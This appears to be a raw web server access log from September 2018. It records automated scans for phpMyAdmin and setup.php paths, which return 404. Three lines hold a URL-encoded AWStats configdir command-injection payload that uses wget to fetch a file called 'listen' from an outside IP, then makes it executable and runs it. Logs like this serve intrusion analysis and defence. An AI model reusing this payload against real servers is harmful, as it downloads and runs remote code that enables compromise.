"IP",           "Date",              "Method", "Status", "Size",    "URI", "UA"
"190.102.146.26","30/Sep/2018:13:55:49","GET","404","518","/phpMyAdmin+++---/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"190.102.146.26","30/Sep/2018:13:55:50","GET","404","510","/shaAdmin/index.php"," Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
No User Agent
"96.68.165.185","30/Sep/2018:13:57:29","GET","400","0","/awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024%2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo|"," -",
No User Agent
"96.68.165.185","30/Sep/2018:13:57:30","GET","400","0","/cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024%2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo|"," -",
No User Agent
"96.68.165.185","30/Sep/2018:13:57:31","GET","400","0","/cgi-bin/awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024%2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo|"," -",
"122.248.248.126","30/Sep/2018:19:59:30","GET","404","461","/phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"122.248.248.126","30/Sep/2018:19:59:31","GET","404","461","/phpmyadmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"122.248.248.126","30/Sep/2018:19:59:31","GET","404","462","/_phpMyAdmin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"122.248.248.126","30/Sep/2018:19:59:32","GET","404","456","/admin/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"122.248.248.126","30/Sep/2018:19:59:32","GET","404","450","/scripts/setup.php"," Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
